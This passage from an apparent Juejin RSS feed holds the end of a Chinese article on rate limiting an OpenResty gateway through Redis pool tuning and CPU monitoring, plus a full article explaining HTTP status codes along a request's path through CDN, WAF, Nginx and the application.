<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b43a6b6826d41158d29d16fc6632539~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=NRxD9aPGhFYZEacBJylcEGppRDk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68749d0a27a84a46944a43ff924002e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=1KP%2BPRowkKKGWEf6NduTa%2F4eTRA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>导出的nginx火焰图对比：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72094c0f32894bafa71d9af848443854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=kifmmGDN%2FVZSm31IW6%2F%2B6lnQnnY%3D" alt="image.png" loading="lazy"/></p>
<p><strong>分析：</strong></p>
<p>这里的火焰图是限流之前和之后的nginx cpu火焰图，黑圈中的unknown部分就是lua代码使用的cpu，可以看出限流后确实lua cpu使用率降低了，同时每秒成功请求数也提升了16%左右。但是并没有达到我们希望的理想效果，异常率还是有点高，这部分需要后面继续优化下限流方案。</p>
<p>这里我们重新考虑下redis，因为redis的连接池导致有部分请求失败，但是实际上redis支持的连接数上限是很高的，是否可以通过调整redis连接池配置的方式进一步优化？</p>
<h6 data-id="heading-5">1.4 redis连接池配置调整</h6>
<p>我们这里不直接修改redis的连接池的最大连接数，修改连接数用满时的存放redis请求的队列的最大值，之前是400，我们改成2000来进行测试下。</p>
<p><strong>测试结果：</strong></p>
<p>qps: 2424</p>
<p>成功率：56.6%</p>
<p>每秒成功请求数：2424*56.6%=1,371</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e3cc429a41b42029c16b5d69c671719~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=ASn%2BwQh%2FwDMz7ZwLAYzB2HWB5FQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a7ce91901c64547b4ce318641dc2087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=W5ZDhs3DFmYjlS7Os%2BYeeoVRwtc%3D" alt="image.png" loading="lazy"/></p>
<p><strong>分析：</strong></p>
<p>我们发现qps下降了，但是请求的成功率上升了很多，从而每秒成功请求数也上升了很多。这里分析下原因，应该是因为我们使用hey的压测是3700并发，并且每个连接每秒最多请求一次，通过这种方式控制总qps最多是3700/秒。 这里把redis请求放入了队列，导致更多的请求能够被成功处理，只是请求本身的延迟变高了，因此在每个连接上的qps就降低了。</p>
<p>举个例子，本来一个连接1秒一次，因为redis超过队列，就失败了，而队列加长后，可能变成每个连接的请求2秒才处理完成，但是redis请求在队列中等待，请求处理成功了，因此qps降低了，但是请求成功率上升了。</p>
<h4 data-id="heading-6">二、openresty网关限流方案探索</h4>
<p>这里探索下openresty网关的限流方案，我们希望找到的最理想的方案就是能有一个指标可以明确表示出nginx的处理能力，这个指标出问题就说明nginx超过了其最大处理能力，请求会出问题。因此最主要的步骤就是找出这个能体现nginx处理能力是否到达阈值的指标。</p>
<p>我们首先参考了java的web服务器的架构，java的请求是在worker线程中一个一个处理的，未被处理的请求被放在一个队列中，因此我们可以监控这个队列，只要队列里面堆积的请求数超过一定数量，就代表到达了web服务器的处理能力上限，我们就可以直接丢弃新请求进行限流，避免服务器被冲垮。</p>
<h5 data-id="heading-7">2.1 架构区别</h5>
<p>但是在nginx中我们发现这种方案并不适用，因为nginx和java的web服务器处理模型不一样。java的web服务器虽然也有异步，但是异步比较少，像是redis和mong这种数据库处理基本都是同步的，因此他处理请求都是一个一个处理，上一个处理完成了再处理下一个，因为查询redis和mongo的同步导致请求的处理过程也基本是同步的。</p>
<p>而nginx不一样，nginx是异步模型，请求被nginx的worker进程accept接收后进行处理时，数据到了就会执行lua代码进行处理，等lua执行到redis查询时，这个是一个io，nginx会异步处理，直接切换下一个请求并处理，等到redis的回复数据到了之后再回来处理之前的请求。这就导致监控他的队列没什么效果，因为他接收请求的速度很快，只要有cpu就会把请求接进来，用队列监控的方式没有效果。</p>
<p>那么监控正在处理中的请求数量有用么？ 这个可以通过nginx的ngx.var.connections_writing变量来查询，他代表nginx正在处理的请求数，但是我们发现这个也不好使，因为你不能判断到多少的时候nginx是有问题的。那用什么指标比较合适呢？下面列一下我们尝试使用作为阈值的指标。</p>
<h5 data-id="heading-8">2.2 可能的指标</h5>
<ol>
<li>socket中未读的数据，epollo中待处理的io数量：如果nginx来不及处理，则建立的socket中会有来不及处理的数据，Established 状态下的 Recv-Q会变大，同时因为worker实例因为cpu跑满也没时间去accept连接，则LISTEN状态下的Recv-Q也会变大，但是这个指标并不能很好的获取并用于限流，因为nginx没到极限时，这些值也会有，只是多和少的区别。</li>
<li>ngx.var.connections_writing数量，nginx正在处理的请求数：这个值没法很好的体现是否堆积，因为他代表当前正在处理的请求，等于qps 乘以 延迟，比如有些请求比较慢，但是qps不高，也会导致这个值有一定的数量，无法用于判断现在是否过载。</li>
</ol>
<p>因此，我感觉<strong>目前最合适的指标就是nginx实例的cpu使用率，这个指标显而易见，但是也是最有效的。</strong></p>
<h5 data-id="heading-9">2.3 cpu过载的后果</h5>
<p>假设此时qps超过了nginx本身的处理能力，cpu打满是必然现象，因为nginx会异步的不断的接收新请求并进行处理，只要cpu没满，就能接收更多的请求并处理。</p>
<p>cpu打满后，请求会变慢，有些io如redis，mysql和mongo请求就会超时，导致虽然请求返回200，但是状态码是失败的。同时达到最大值后，nginx从socket中获取数据处理请求的速度变慢，socket中的请求会一直得不到处理，甚至nginx建立redis连接都会失败，从而连接池中的redis连接下降，进一步导致雪崩，本来能处理的请求也处理不了了。</p>
<p><strong>结论：</strong></p>
<p>综上所述，只要nginx的cpu没跑满，就代表nginx没问题，可以处理更多请求。但是一旦nginx的cpu跑满，就容易出现雪崩状态，所有的请求都正在被处理，但是因为cpu不足，请求会因为各种原因失败，整体失败率大幅上升，造成雪崩。</p>
<p><strong>如果出现nginx cpu跑满的情况时，可以通过动态限流或者增加nginx实例避免雪崩。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[面试必问HTTP状态码：从“请求的一生”彻底搞懂，告别死记硬背]]></title>    <link>https://juejin.cn/post/7605848213602779182</link>    <guid>https://juejin.cn/post/7605848213602779182</guid>    <pubDate>2026-02-12T15:28:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602779182" data-draft-id="7605769126271352878" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="面试必问HTTP状态码：从“请求的一生”彻底搞懂，告别死记硬背"/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2026-02-12T15:28:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="YouRock"/> <meta itemprop="url" content="https://juejin.cn/user/2331425496367565"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            面试必问HTTP状态码：从“请求的一生”彻底搞懂，告别死记硬背
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2331425496367565/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    YouRock
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T15:28:49.000Z" title="Thu Feb 12 2026 15:28:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">HTTP状态码：从请求的一生重新理解</h2>
<blockquote>
<p>“所有数字背后，都是一个请求的遗言。”</p>
<p>—— 某位被502逼疯的工程师</p>
</blockquote>
<p>或者，你也可以记住这一句：</p>
<blockquote>
<p>“状态码不是用来背的，是用来收尸的。”</p>
<p>—— 同一位工程师，在又一次凌晨三点被叫起来之后</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">为什么写这篇文章</h3>
<p>相信很多朋友面试的时候都会被面试官问到：“你记得多少HTTP状态码？具体有哪些含义？”</p>
<p>一般对于这类问题，我们都会提前复习和记忆，才能回答得比较完整。</p>
<p>但后来我发现一件事：</p>
<blockquote>
<p>“背状态码就像背尸检报告，你记住了死因，却没见过现场。”</p>
<p>—— 某位靠背答案转行写代码的面试者</p>
</blockquote>
<p>本文从一个请求离开客户端之后的链路出发，带你去<strong>看现场</strong>。</p>
<p>要彻底搞懂HTTP状态码，我们可以换一种思路：<strong>设计这么多状态码，它们具体是在哪一环节、因为什么原因被返回的？</strong></p>
<p>我们的请求传递到整个后端，并不是直接访问到服务器。它要经过一大批网络组件的筛选过滤，每一关都有可能倒下，每一关都会有人替它写下遗言。</p>
<p>下面，让我们从一个请求发送到后端的链路，重新认识一下HTTP状态码。</p>
<hr/>
<h3 data-id="heading-2">第一站：边缘节点 CDN</h3>
<blockquote>
<p>“我以为我能活到源站，结果在门口就被拦下了。”</p>
<p>—— 一个试图直接访问服务器的请求</p>
</blockquote>
<p>当一个请求经过DNS解析离开设备，遇到的第一个网络组件是CDN。</p>
<p>CDN是一种缓存设备。它把源服务器的资源拉取到离你最近的地方，像个热情过度的前台：“你要这个？我这有，别往里跑了。”</p>
<p>遇到热门的资源文件（比如B站、抖音的热门视频），直接从CDN获取，速度远远快于访问远端的服务器。对于这些占用<strong>带宽</strong>较大的静态文件资源，缓存到CDN上是性价比最高的方案。</p>
<h4 data-id="heading-3">CDN节点状态码</h4>



































<table><thead><tr><th>状态码</th><th>含义</th><th>死因报告</th></tr></thead><tbody><tr><td><code>200</code></td><td>成功命中</td><td>“我这有，拿去吧。”</td></tr><tr><td><code>304</code></td><td>未修改</td><td>“你手里的还是新鲜的，不用换。”</td></tr><tr><td><code>502</code></td><td>回源非法响应</td><td>“我去帮你问，结果源站说方言，听不懂。”</td></tr><tr><td><code>503</code></td><td>回源连接拒绝</td><td>“源站把门关上了，不让我进。”</td></tr><tr><td><code>504</code></td><td>回源超时</td><td>“源站接了电话，但一直不说话。”</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>304是个好东西</strong></p>
<p>每次向CDN发起请求，并不一定需要CDN把整个文件再发一遍。</p>
<p>如果我们本地有缓存，带着文件的指纹（ETag）或修改时间（Last-Modified）去问CDN：“我这个还新鲜吗？”</p>
<p>CDN看一眼：“没变，接着用吧。”</p>
<p><strong>省带宽，省时间，双方都舒服。</strong></p>
<p>—— 这是唯一一个**请求和服务器达成共识“你不用干活”**的状态码。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">第二站：安全网关 WAF</h3>
<blockquote>
<p>“我不是不让你进，我是怕你进来搞破坏。”</p>
<p>—— WAF，一个没有感情的安检机器</p>
</blockquote>
<p>请求离开CDN后，仍然不能直接到达源站。它先要经过<strong>WAF</strong>——Web应用防火墙。</p>
<p>这个组件的作用，名字已经写得很清楚：<strong>为了安全</strong>。</p>
<p>它像个眼神锐利的保安，把你从头扫到脚：</p>
<ol>
<li><strong>检查IP是否合法</strong> → 不合法返回 <code>403 Forbidden</code></li>
<li><strong>检查请求头是否合法</strong> → 不合法返回 <code>406 Not Acceptable</code></li>
<li><strong>检查请求体是否合法</strong> → 不合法返回 <code>413 Payload Too Large</code></li>
<li><strong>判断请求频率是否正常</strong> → 不合法返回 <code>429 Too Many Requests</code></li>
</ol>
<h4 data-id="heading-5">WAF状态码场景</h4>






























<table><thead><tr><th>攻击/异常类型</th><th>状态码</th><th>死因报告</th></tr></thead><tbody><tr><td>黑名单IP/SQL注入/XSS</td><td><code>403</code></td><td>“你身上有刀，不许进。”</td></tr><tr><td>无效Accept头</td><td><code>406</code></td><td>“你要的东西我给不了，别进了。”</td></tr><tr><td>超大请求体</td><td><code>413</code></td><td>“你扛的箱子太大了，进不来。”</td></tr><tr><td>CC攻击/高频请求</td><td><code>429</code></td><td>“你来回跑太多次了，歇会儿。”</td></tr></tbody></table>
<p>这些“不正经”的请求方式，其实就是网络安全课里讲的攻击手段。</p>
<blockquote>
<p>“我只是想进来看看，它说我是黑客。”</p>
<p>—— 一个带着正常User-Agent却被误杀的公司内网爬虫</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">第三站：负载均衡器 Nginx</h3>
<blockquote>
<p>“一万个用户就要一万个进程？凭什么等网速还要占着位置？”</p>
<p>—— Igor Sysoev，Nginx之父，2002年</p>
</blockquote>
<p>对于这个组件，一开始我也不明白它为什么有那么多功能。</p>
<p>要认识一件东西，最好的方式是<strong>了解它为什么被创造出来</strong>。</p>
<hr/>
<p><strong>2002年，莫斯科。</strong></p>
<p>Apache的规矩：来一个人开一个进程，来一万个人开一万个进程。</p>
<p>16G内存，Apache张嘴要50G，然后跪了。</p>
<p>Igor Sysoev每天的工作就是重启服务器——像给同一个病人反复做心肺复苏。</p>
<p>终于有一天他骂了句脏话：</p>
<blockquote>
<p>“一万个用户就要一万个进程？凭什么等网速的时候还要占着内存？”</p>
</blockquote>
<p>他觉得这不合理——像每个客人身后站一个专属服务员，客人上厕所他都得站着等。</p>
<p>Igor决定写一个“不讲武德”的服务器：</p>
<p><strong>一个服务员管五十桌，谁招手过去，谁看菜单就晾着。不等人，不空转，不占茅坑。</strong></p>
<p>两年，一万行C。</p>
<p>2004年，Nginx诞生。</p>
<p><strong>4个进程扛1万连接，内存500MB。</strong></p>
<p>Apache用50G干的活，它用1%的资源。</p>
<p>后来有人问他为什么写Nginx。</p>
<p>他说：</p>
<blockquote>
<p><strong>“等的时候，不应该占着位置。”</strong></p>
</blockquote>
<hr/>
<h4 data-id="heading-7">Nginx核心状态码</h4>













































<table><thead><tr><th>场景</th><th>状态码</th><th>死因报告</th></tr></thead><tbody><tr><td>静态文件不存在</td><td><code>404</code></td><td>“你要的文件，硬盘里没有。”</td></tr><tr><td>静态文件无权限</td><td><code>403</code></td><td>“文件在那，但你不配看。”</td></tr><tr><td>后端无响应</td><td><code>502</code></td><td>“我把请求转给后面，后面没人接。”</td></tr><tr><td>后端超时</td><td><code>504</code></td><td>“后面接了电话，但一直‘嗯’个不停，就是不说话。”</td></tr><tr><td>客户端提前关闭</td><td><code>499</code></td><td>“用户等不及，把网页关了。”</td></tr><tr><td>限流拦截</td><td><code>429</code></td><td>“你刷太快了，我伺候不动。”</td></tr><tr><td>主动熔断</td><td><code>503</code></td><td>“后面的兄弟都快累死了，我先替你挡一下。”</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>关于499</strong></p>
<p><code>499</code>是Nginx独有的状态码。</p>
<p>它不是后端返回的，不是WAF拦截的，是Nginx自己记下的遗言：</p>
<p><strong>“他没等我，他走了。”</strong></p>
<p>很多时候你以为的超时（504），其实是用户等得不耐烦，直接关掉了页面。</p>
<p>Nginx默默在日志里写下一行：
<em>“请求已转发，但客户端已失联。”</em></p>
</blockquote>
<hr/>
<h3 data-id="heading-8">第四站：Web 应用</h3>
<blockquote>
<p>“终于到我了。”</p>
<p>—— 一个请求，在穿过CDN、WAF、Nginx之后</p>
</blockquote>
<p>终于，请求到达了后端应用。</p>
<p>这里的HTTP状态码，是<strong>开发者在代码里亲手写下的</strong>。</p>
<p>它是唯一一个<strong>由你决定生死</strong>的环节。</p>
<hr/>
<h4 data-id="heading-9">4xx：你的问题，不是我的问题</h4>
<blockquote>
<p>“你发过来的东西，我尽力了，真的看不懂。”</p>
<p>—— 应用对400说</p>
</blockquote>








































<table><thead><tr><th>状态码</th><th>含义</th><th>死因报告</th></tr></thead><tbody><tr><td><code>400</code></td><td>我看不懂</td><td>JSON少括号、类型传错、必填字段没带</td></tr><tr><td><code>401</code></td><td>你没登录</td><td>没带Token、Token过期、Token被篡改</td></tr><tr><td><code>403</code></td><td>你不能进</td><td>普通用户点管理员接口、IP不在白名单</td></tr><tr><td><code>404</code></td><td>我没有</td><td>查不存在的用户ID、已下架的商品</td></tr><tr><td><code>409</code></td><td>已经有了</td><td>用户名被占用、重复提交、<strong>两人同时编辑同一条数据</strong></td></tr><tr><td><code>422</code></td><td>内容不对</td><td>邮箱格式正确但未注册、年龄传了200岁</td></tr></tbody></table>
<blockquote>
<p>“你说你叫admin，但我这已经有叫admin的了。”</p>
<p>—— 409 Conflict，注册接口的日常</p>
</blockquote>
<hr/>
<h4 data-id="heading-10">2xx：一切顺利</h4>
<blockquote>
<p>“今天是个好日子。”</p>
<p>—— 200 OK，最幸福的状态码</p>
</blockquote>






























<table><thead><tr><th>状态码</th><th>含义</th><th>遗言（活着的遗言）</th></tr></thead><tbody><tr><td><code>200</code></td><td>成功</td><td>“成了，数据给你。”</td></tr><tr><td><code>201</code></td><td>创建成功</td><td>“成了，新资源在这。”</td></tr><tr><td><code>202</code></td><td>已接受</td><td>“收下了，后面慢慢弄。”</td></tr><tr><td><code>204</code></td><td>成功，无返回</td><td>“成了，但没啥可说的。”</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-11">3xx：别找我，去那边</h4>
<blockquote>
<p>“我已经搬家了，这是新地址。”</p>
<p>—— 301，一个负责任的旧门牌</p>
</blockquote>

























<table><thead><tr><th>状态码</th><th>含义</th><th>死因报告</th></tr></thead><tbody><tr><td><code>301</code></td><td>永久搬家</td><td>“这里不住了，以后去那边找我。”</td></tr><tr><td><code>302</code></td><td>临时离开</td><td>“现在不在，你先去隔壁。”</td></tr><tr><td><code>304</code></td><td>没变</td><td>“你手里那个还能用，别下载了。”</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-12">5xx：我炸了，不是你的错</h4>
<blockquote>
<p>“对不起，是我的问题。”</p>
<p>—— 500 Internal Server Error，一个有礼貌的崩溃</p>
</blockquote>






























<table><thead><tr><th>状态码</th><th>含义</th><th>死因报告</th></tr></thead><tbody><tr><td><code>500</code></td><td>代码崩溃</td><td>空指针、数据库连不上、try-catch没接住</td></tr><tr><td><code>502</code></td><td>上游乱说话</td><td>第三方API返回乱码、Redis数据结构不对</td></tr><tr><td><code>503</code></td><td>我拒绝</td><td>连接池满了、服务正在重启</td></tr><tr><td><code>504</code></td><td>上游太慢</td><td>第三方API超时、SQL查了10秒</td></tr></tbody></table>
<blockquote>
<p>“我调了别人的接口，别人没回我。”</p>
<p>—— 504，一个被上游坑死的请求</p>
</blockquote>
<hr/>
<h3 data-id="heading-13">链路简图 · 请求的一生</h3>
<blockquote>
<p>“这不是架构图，这是事故多发路段示意图。”</p>
</blockquote>
<h3 data-id="heading-14"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad14b362873c44bd80c07f74e336b0cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWW91Um9jaw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771514929&amp;x-signature=CuDQkpjMCvEH5WU37x14oPH4jAU%3D" alt="20260212-230754.jpeg" loading="lazy"/></h3>
<h3 data-id="heading-15">写在最后：状态码不是数字，是请求的“尸检报告”</h3>
<p>行文至此，我们已经陪着一个HTTP请求走完了它的完整一生。</p>
<p>它从你的浏览器出发，叩开CDN的大门，穿过WAF的安检，经过Nginx的调度，最终抵达应用服务器的后厨。</p>
<p>而在每一道关卡，都有可能倒下——也可能凯旋。</p>
<p><strong>每一个状态码，都不是随机数字，而是请求倒下的那一刻，最后一个活着的人替它写下的死因报告。</strong></p>
<hr/>
<p>当你再看到<code>502</code>，你脑海里应该浮现的不是“Bad Gateway”这行英文，而是一场事故现场：</p>
<ul>
<li>也许是CDN回源时，源站说了句它听不懂的方言（非法响应）</li>
<li>也许是Nginx转发时，后端的应用根本没在听（连接失败）</li>
<li>也许是你的代码调用第三方API，对方接了电话但开始沉默（超时）</li>
<li>也许是负载均衡器巡视一圈，发现所有小弟都已阵亡（无可用后端）</li>
</ul>
<blockquote>
<p><strong>同一个502，七种死法。症状相同，病灶各异。</strong></p>
</blockquote>
<p>这就是为什么，学会背状态码的人只能回答“它是什么意思”，而理解链路的人能回答：</p>
<p><strong>“它死在了哪一环。”</strong></p>
<hr/>
<p>这趟旅程也告诉我们另一件事：</p>
<p>CDN会替你背锅，Nginx会替你扛压，WAF会替你挡刀——但它们都只是过客。</p>
<p><strong>唯一从头到尾、从生到死都陪着你代码的，是你自己写的业务逻辑。</strong></p>
<p><code>200</code>是你写的，<code>404</code>是你写的，<code>500</code>也是你写的。</p>
<blockquote>
<p><strong>状态码不是面试官拷问你的工具，而是你的代码和这个世界对话的语言。</strong></p>
</blockquote>
<p>你用<code>200</code>说：“一切正常。”<br/>
你用<code>404</code>说：“你找的东西不在这里。”<br/>
你用<code>500</code>说：“抱歉，我出了点问题，已经在看日志了。”</p>
<hr/>
<p>所以，别再背状态码了。</p>
<p>去理解你请求走过的路，去读懂每一行日志，去亲手写下每一个你返回的状态码。</p>
<p><strong>当你不再问“502是什么意思”，而是问——</strong></p>
<blockquote>
<p>“这个502是谁报的？”<br/>
“在哪一环报的？”<br/>
“日志里留下了什么线索？”</p>
</blockquote>
<p><strong>那一刻，你就不再是背答案的人，而是真的懂了。</strong></p>
<hr/>
<blockquote>
<p>“愿你的200永远不鸽，愿你的5xx永远有日志可查。”</p>
<p>—— 同一位被502逼疯的工程师，在最后一次上线后说</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【React-9/Lesson93(2025-12-30)】React Hooks 深度解析：从基础到实战🎯]]></title>    <link>https://juejin.cn/post/7605782093481689114</link>    <guid>https://juejin.cn/post/7605782093481689114</guid>    <pubDate>2026-02-12T11:28:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605782093481689114" data-draft-id="7605535884940361779" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【React-9/Lesson93(2025-12-30)】React Hooks 深度解析：从基础到实战🎯"/> <meta itemprop="keywords" content="React.js,前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-12T11:28:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jing_Rainbow"/> <meta itemprop="url" content="https://juejin.cn/user/1285809519198256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 